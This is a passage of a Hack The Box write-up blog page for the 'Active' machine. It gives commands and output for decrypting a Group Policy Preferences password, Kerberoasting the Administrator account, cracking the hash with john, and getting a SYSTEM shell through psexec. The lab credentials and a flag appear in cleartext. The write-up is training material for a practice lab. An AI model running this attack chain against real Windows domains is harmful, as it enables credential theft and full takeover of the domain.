+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\P</span>references<span style="color:#ae81ff">\&gt;</span> cd Groups
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\P</span>references<span style="color:#ae81ff">\G</span>roups<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Groups.xml                          A      <span style="color:#ae81ff">533</span>  Wed Jul <span style="color:#ae81ff">18</span> 16:46:06 <span style="color:#ae81ff">2018</span>
+</span></span></code></pre></div><p>I read this file <code>Groups.xml</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat  Groups.xml
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;Groups clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span> image<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> changed<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span> uid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;U&#34;</span> newName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> fullName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> cpassword<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> changeLogon<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> noChange<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> neverExpires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> acctDisabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> userName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
+</span></span><span style="display:flex;"><span>&lt;/Groups&gt;
+</span></span></code></pre></div><p>I <code>decode</code> this hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gpp-decrypt <span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span>
+</span></span><span style="display:flex;"><span>GPPstillStandingStrong2k18
+</span></span></code></pre></div><p>Credentials:</p>
+<pre tabindex="0"><code>active.htb\SVC_TGS:GPPstillStandingStrong2k18
+</code></pre><p>I see the <code>Share</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions     Comment
+</span></span><span style="display:flex;"><span>        ----                                                    -----------     -------
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS       Remote Admin
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS       Default share
+</span></span><span style="display:flex;"><span>        IPC$                                                    NO ACCESS       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON                                                READ ONLY       Logon server share 
+</span></span><span style="display:flex;"><span>        Replication                                             READ ONLY
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  READ ONLY       Logon server share 
+</span></span><span style="display:flex;"><span>        Users                                                   READ ONLY
+</span></span></code></pre></div><p>I connect in this Share <code>Users</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //10.10.10.100/Users -U SVC_TGS           
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> whoami
+</span></span><span style="display:flex;"><span>whoami: command not found
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                  DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                 DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Administrator                       D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">16</span> 06:14:21 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  All Users                       DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 02:38:21 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Default User                    DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Public                             DR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  SVC_TGS                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311050</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd SVC_TGS 
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Contacts                            D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:11 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Desktop                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:42 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Downloads                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:23 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Favorites                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Links                               D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Documents                        D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:03 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Music                            D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Pictures                         D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:43 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Videos                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:53 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Saved Games                         D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:12 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Searches                            D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:24 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311050</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\&gt;</span> cd Desktop
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:42 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:42 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  user.txt                           AR       <span style="color:#ae81ff">34</span>  Wed Jul <span style="color:#ae81ff">19</span> 14:13:20 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5217023</span> blocks of size 4096. <span style="color:#ae81ff">311050</span> blocks available
+</span></span></code></pre></div><p>I take the <code>user flag</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\&gt;</span> get user.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt of size <span style="color:#ae81ff">34</span> as user.txt <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\&gt;</span> 
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I search this script <code>GetUserSPNs.py</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ locate GetUserSPNs.py
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/GetUserSPNs.py
+</span></span></code></pre></div><h3 id="kerberoasting">Kerberoasting<a href="#kerberoasting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I get a list of <code>SPNs</code> on the target Windows domain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd /usr/share/doc/python3-impacket/examples/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/usr/share/doc/python3-impacket/examples<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+</span></span><span style="display:flex;"><span>Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+</span></span><span style="display:flex;"><span>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span style="display:flex;"><span>active/CIFS:445       Administrator  CN<span style="color:#f92672">=</span>Group Policy Creator Owners,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb  2018-07-18 15:06:40.351723  2023-07-20 02:34:38.561772             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0ed19e3ceaaad5c79c896826fa8fb918$c10fb7d9078cefce4cf9032760f7fe62163d5c2a07f4e64757e4ec8fa539c4111a6bd8351ba6c095a11fdd19fc7b6a1db9b80b9c53ff856d1b189197534d24cf509d484c0466163199690e81ae7767affb40f02eaca7ea594f150097a5d7b24f21494ea34289607d635c748a1e4832041234ea315b1dbd41a7095369b8dfa63d877b6747239560855afa81bb0204f7d73c756ecf945502e58791aba199d2ca8fc99e3d7700043ff30eb15bb66b90eaf47b8f1280f4204546769e411f9eee10dde475311a76503939f31116dbeb10e95552c2eb32faa444cd0f0e83b9c2a79fc3fb358573b5e155519cb19dfbac8cc4e953135cb1d25050a1fb5f72b9ddd37399cf8a7de3277a2841a6cc91b80da9a65a26f58d080846afac4e8e3f1ea7d6ce7300fc7e382b7a1574efbcb2dcd39bbba63050d30fc21100d96549973fa24512330f728ebbc2cf1d0c5bfac71ffba7de0b84a59b3e30da13c983623d8b17a15763588e8dffc24ce8dde70b58c80093940c0c8f03f4a607043b260765b98d8367425ece4109335da423a69de6803c30f575144b5c1bc00b9103bcf76b756fc57839aaa061060f25b0780e1d83321681862d6c590630c9581a25ae86caff1faef5227afff65ee1f74b6a0a84b28d23462b100ffd77fbbeb8ccb399b254bb125bd5b219b056695735bfbacd8da0e70ffdbc1cb27f2b1ba42670e8e86fe184772e8e1aa094df8d71ca301685505812ee615b60b307e2edad80732d7acfde76ca3bc1b4245f28fb4dd8a652648675eabc96932b1055c1ea7a899f5f59d09041af46955a0c7d2c9eee9322f87f772de6317bb50ee0614f679bb3f45099f2c3d3e34ed14a6e09af45ca52fcb6380b005f38301f931e3040a26be5e8b3a41037edd3f6ab05cb49c6a178b8548869fc2cf80572a01104886780f07cff9d7a87ae7b6f4081f91ce4e4e3ac8cfd37f8a765ce99345f3e615b5a47093c0400c12da33a2e688a9c026732861595fdf5ab1d0c77aaf5d373550201bd5cf80786499709c91f84a5acca5daad02a45d4d8f984ce9f7677aab7a96edf175841d98659902c05259fbdbc61609efedc3378c26588c1c46dd088fc84ba46533b020521c395581f903b5af9e0ad07aaaff20020782bd497eb3207ff00d4362eecd4b82efd212b7fe9ea56d4184b2def1eedf47fcf509db8095a3c7ff68d0e62e750883c73b3b68339c3a4073c33d91f4672ab3dea4c4aed659aa77cbfd448d1e4ca64fd512e
+</span></span></code></pre></div><p>I put this hash inside a file and I <code>crack</code> the hash with <code>john</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano hash   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john hash -wordlist:/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>krb5tgs, Kerberos <span style="color:#ae81ff">5</span> TGS etype <span style="color:#ae81ff">23</span> <span style="color:#f92672">[</span>MD4 HMAC-MD5 RC4<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">2</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>Ticketmaster1968 <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:16 DONE <span style="color:#f92672">(</span>2023-07-20 06:06<span style="color:#f92672">)</span> 0.06242g/s 657769p/s 657769c/s 657769C/s Tiffani1432..Tiago_18
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Credentials:</p>
+<pre tabindex="0"><code>Administrator:Ticketmaster1968
+</code></pre><p>I use <code>psexec.py</code> to  log on in the Machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/usr/share/doc/python3-impacket/examples<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 psexec.py Administrator@10.10.10.100
+</span></span><span style="display:flex;"><span>Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.10.100.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file UotrqOeE.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.10.100.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service USFz on 10.10.10.100.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service USFz.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; cd C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 15BB-D59C
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>21/01/2021  07:49 ��    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>21/01/2021  07:49 ��    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span style="display:flex;"><span>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span style="display:flex;"><span>and <span style="color:#66d9ef">then</span> execute smbexec.py again with -codec and the corresponding codec
+</span></span><span style="display:flex;"><span>20/07/2023  09:34 ��                <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   1.144.229.888 bytes free
+</span></span></code></pre></div><p>I get the <code>root flag</code>:</p>
+<pre tabindex="0"><code>C:\Users\Administrator\Desktop&gt; type root.txt
+e5b694fc24aadcd20fe30b6f98ab67d2
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/steamcloud/">
+                <span class="button__text">HTB Writeup - SteamCloud (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
